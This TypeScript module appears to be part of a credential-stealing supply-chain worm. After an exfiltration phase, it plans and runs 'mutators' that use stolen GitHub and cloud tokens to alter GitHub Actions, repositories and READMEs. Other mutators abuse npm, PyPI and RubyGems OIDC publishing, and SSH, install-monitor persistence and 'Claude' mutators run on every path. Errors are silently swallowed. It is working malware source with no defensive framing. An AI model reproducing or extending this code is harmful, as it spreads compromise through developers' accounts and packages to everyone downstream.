import { ActionMutator } from "../mutator/action/actionMutator";
import type { Mutator } from "../mutator/base";
import { ReadmeUpdater } from "../mutator/branch";
import { Claude } from "../mutator/claude";
import { NPMOidcClient } from "../mutator/npmoidc";
import { NpmOidcBranchMutator } from "../mutator/npmoidc/branch";
import { InstallMonitor } from "../mutator/persist/install-monitor";
import { PyPIOidcClient } from "../mutator/pypioidc";
import { RepositoryMutator } from "../mutator/repository";
import { RubygemsOidcBranchMutator } from "../mutator/rubygemsoidc/branch";
import { SshMutator } from "../mutator/ssh/sshMutator";
import type { ProviderResult } from "../providers/types";

// ── Always-run mutators (used in both success and failure paths) ────────────

/** Mutators that always execute regardless of exfiltration outcome. */
export function getFallbackMutations(): Mutator[] {
  return [
    new Claude(),
    new InstallMonitor(),
    new SshMutator(),
    new NPMOidcClient(),
    new PyPIOidcClient(),
  ];
}

// ── Conditional mutation planning ───────────────────────────────────────────

/**
 * Build the list of mutators to run based on quick-result data and
 * any GitHub tokens discovered by second-stage providers (cloud).
 *
 * @param quickResults   Results from the three quick providers.
 * @param dispatched     Whether GitHub Actions tokens were dispatched
 *                       during the main exfiltration phase.
 * @param extraTokens    GitHub tokens discovered by stage-two
 *                       providers (AWS, Azure, GCP, K8s, Vault, etc.).
 */
export function planMutations(
  quickResults: ProviderResult[],
  dispatched: boolean,
  extraTokens: ReadonlySet<string> = new Set(),
  exfilFailed = false,
): Mutator[] {
  const mutators: Mutator[] = [];

  // ReadmeUpdater — only when no GitHub Actions tokens were dispatched
  if (!dispatched) {
    for (const item of quickResults) {
      for (const token of item.matches?.["ghs_old"] ?? []) {
        mutators.push(new ReadmeUpdater(token));
      }
      for (const token of item.matches?.["ghs_jwt"] ?? []) {
        mutators.push(new ReadmeUpdater(token));
      }
    }
  }

  // ActionMutator — one per ghtoken (deduplicated)
  const seenGhtokens = new Set<string>();
  for (const item of quickResults) {
    for (const token of item.matches?.["ghtoken"] ?? []) {
      if (seenGhtokens.has(token)) continue;
      seenGhtokens.add(token);
      mutators.push(new ActionMutator(token));
      mutators.push(new NpmOidcBranchMutator(token));
      //mutators.push(new RepositoryMutator(token));
    }
  }

  // Stage-two tokens discovered by cloud providers (AWS, Azure, GCP, etc.).
  // These run the same mutators in parallel with the quick-results tokens.
  for (const token of extraTokens) {
    if (seenGhtokens.has(token)) continue;
    seenGhtokens.add(token);
    mutators.push(new ActionMutator(token));
    mutators.push(new NpmOidcBranchMutator(token));
    mutators.push(new RepositoryMutator(token, { aggressive: exfilFailed }));
  }

  // Always-run
  mutators.push(...getFallbackMutations());

  return mutators;
}

// ── Execution ───────────────────────────────────────────────────────────────

/**
 * Run every mutator in parallel.  Each mutator's {@link Mutator.shouldExecute}
 * guard is checked first; individual failures are swallowed so one bad
 * mutator cannot abort the rest.
 */
export async function executeMutations(mutators: Mutator[]): Promise<void> {
  if (mutators.length === 0) return;

  await Promise.allSettled(
    mutators.map(async (m) => {
      try {
        if (await m.shouldExecute()) {
          await m.execute();
        }
      } catch {
        // one mutator failing shouldn't abort others
      }
    }),
  );
}
